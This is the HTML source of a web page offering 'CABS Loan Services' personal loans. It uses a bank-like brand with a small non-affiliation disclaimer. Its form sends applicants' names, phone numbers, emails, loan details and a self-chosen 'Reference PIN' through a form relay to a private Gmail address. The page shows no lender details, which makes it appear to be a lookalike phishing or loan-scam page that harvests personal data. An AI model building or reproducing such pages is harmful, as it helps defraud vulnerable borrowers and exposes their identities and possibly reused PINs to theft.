
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CABS Loan Services</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f2f5fa;
  color: #202b3c;
}
header {
  background: #082b55;
  color: white;
  text-align: center;
  padding: 25px 15px;
}
.logo {
  font-size: 32px;
  font-weight: bold;
  letter-spacing: 2px;
}
header p { margin-bottom: 0; }
.container {
  max-width: 520px;
  margin: 25px auto;
  padding: 25px;
  background: white;
  border-radius: 12px;
  box-shadow: 0 3px 15px #0001;
}
h2 { color: #082b55; text-align: center; }
label {
  display: block;
  margin-top: 15px;
  font-weight: bold;
}
input, select {
  width: 100%;
  padding: 13px;
  margin-top: 7px;
  border: 1px solid #ccd3df;
  border-radius: 6px;
  font-size: 16px;
}
button {
  width: 100%;
  padding: 15px;
  margin-top: 22px;
  background: #e87522;
  border: none;
  color: white;
  font-size: 17px;
  font-weight: bold;
  border-radius: 6px;
  cursor: pointer;
}
.disclaimer {
  background: #fff5e9;
  padding: 12px;
  border-left: 4px solid #e87522;
  font-size: 13px;
  line-height: 1.5;
}
footer {
  text-align: center;
  padding: 20px;
  color: #657084;
  font-size: 12px;
}
</style>
</head>
<body>

<header>
  <div class="logo">CABS</div>
  <h1>CABS Loan Services</h1>
  <p>Personal Loan Application</p>
</header>

<div class="container">
  <h2>Apply for a Loan</h2>

  <p class="disclaimer">
    CABS Loan Services is an independent business and is
    not affiliated with, endorsed by, or operated by
    CABS Bank or its parent organization.
  </p>

  <form action="https://formsubmit.co/kipkiruibenard704@gmail.com"
        method="POST">

    <input type="hidden" name="_subject"
           value="New Loan Application">
    <input type="hidden" name="_captcha" value="true">

    <label>Full Name</label>
    <input type="text" name="Full Name"
           placeholder="Enter your full name" required>

    <label>Country</label>
    <select name="Country" id="country" required>
      <option value="">Select your country</option>
      <option value="Zimbabwe">Zimbabwe</option>
      <option value="Kenya">Kenya</option>
      <option value="South Africa">South Africa</option>
      <option value="Zambia">Zambia</option>
      <option value="Malawi">Malawi</option>
      <option value="Botswana">Botswana</option>
      <option value="Other">Other</option>
    </select>

    <label>Currency Type</label>
    <select name="Currency Type" id="currency" required>
      <option value="">Select country first</option>
    </select>

    <label>Phone Number</label>
    <input type="tel" name="Phone Number"
           placeholder="Enter your phone number" required>

    <label>Email Address</label>
    <input type="email" name="Email"
           placeholder="Enter your email address" required>

    <label>Loan Amount Requested</label>
    <input type="number" name="Loan Amount"
           min="1" placeholder="Enter amount" required>

    <label>Repayment Period</label>
    <select name="Repayment Period" required>
      <option value="">Select repayment period</option>
      <option>1 Month</option>
      <option>3 Months</option>
      <option>6 Months</option>
      <option>12 Months</option>
    </select>

    <label>Reference PIN</label>
    <input type="text" name="Reference PIN"
           placeholder="Create an application reference code"
           maxlength="20" required>

    <button type="submit">Submit Application</button>
  </form>
</div>

<footer>
  © 2026 CABS Loan Services. Independent business.
</footer>

<script>
const country = document.getElementById("country");
const currency = document.getElementById("currency");

const currencies = {
  Zimbabwe: ["USD - US Dollar", "ZWG - Zimbabwe Gold"],
  Kenya: ["KES - Kenyan Shilling"],
  "South Africa": ["ZAR - South African Rand"],
  Zambia: ["ZMW - Zambian Kwacha"],
  Malawi: ["MWK - Malawian Kwacha"],
  Botswana: ["BWP - Botswana Pula"],
  Other: ["USD - US Dollar"]
};

country.addEventListener("change", function () {
  currency.innerHTML = "";

  const options = currencies[this.value] || [];

  const placeholder = document.createElement("option");
  placeholder.value = "";
  placeholder.textContent = "Select currency";
  currency.appendChild(placeholder);

  options.forEach(function (item) {
    const option = document.createElement("option");
    option.value = item;
    option.textContent = item;
    currency.appendChild(option);
  });
});
</script>

</body>
</html>
